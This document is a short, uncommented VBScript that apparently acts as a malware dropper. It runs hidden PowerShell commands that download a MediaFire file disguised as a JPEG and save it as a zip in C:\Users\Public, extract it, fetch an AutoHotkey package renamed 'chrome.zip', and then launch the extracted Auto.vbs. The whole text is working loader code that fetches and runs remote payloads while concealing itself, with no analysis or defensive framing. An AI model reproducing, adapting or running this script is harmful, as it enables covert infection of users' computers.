Dim Shell, Cmd
Set Shell = CreateObject("WScript.Shell")
Function DownloadAndExtract(url, zipPath, extractPath)
    Dim DownloadCmd, ExtractCmd
    DownloadCmd = "powershell.exe Start-BitsTransfer -Source '" & url & "' -Destination '" & zipPath & "'"
    Shell.Run DownloadCmd, 0, True
    ExtractCmd = "powershell.exe Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & extractPath & "'"
    Shell.Run ExtractCmd, 0, True
End Function
DownloadAndExtract "https://download1507.mediafire.com/3ugus3r5wfzgmas4bn_B2p4IsREHzsvsBGLSfsx7lwDy3H1XCK_-m88p82scARCthxn51wf7pDWilUTDl7lLa4fveX4QGdqScLcywLyCc5XvQs9YGB9ifKhRZnnqcr40wLf5kUk9CVXCXz-TGOVoivPaANsw2hmm_8GB3-98IEQ/qr769p7fnrst5zd/xw.jpg", "C:\Users\Public\bbbb.zip", "C:\Users\Public"
DownloadAndExtract "https://www.autohotkey.com/download/1.1/AutoHotkey112304_ansi.zip", "C:\Users\Public\chrome.zip", "C:\Users\Public\"

WScript.Sleep 3000

filePath = "C:\Users\Public\Auto.vbs"
parameter = ""
shell.Run """" & filePath & """ """ & parameter & """"
